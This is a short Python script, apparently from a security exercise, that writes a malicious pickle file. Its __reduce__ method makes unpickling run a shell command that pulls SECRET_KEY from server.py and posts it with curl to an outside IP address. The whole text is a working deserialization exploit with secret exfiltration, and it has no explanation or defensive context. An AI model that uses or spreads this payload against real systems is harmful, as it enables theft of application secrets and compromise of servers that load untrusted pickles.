import pickle
import os

test = {1:"1",2:"2",3:"3"}
class binsh(object):
	def __reduce__(self):
		return(os.system, ('cat server.py | grep "SECRET_KEY" | curl -d @- 18.217.216.108:9000',))

pickleOut = open("5.2.2.1.pickle","wb")
pickle.dump(binsh(), pickleOut)
pickleOut.close()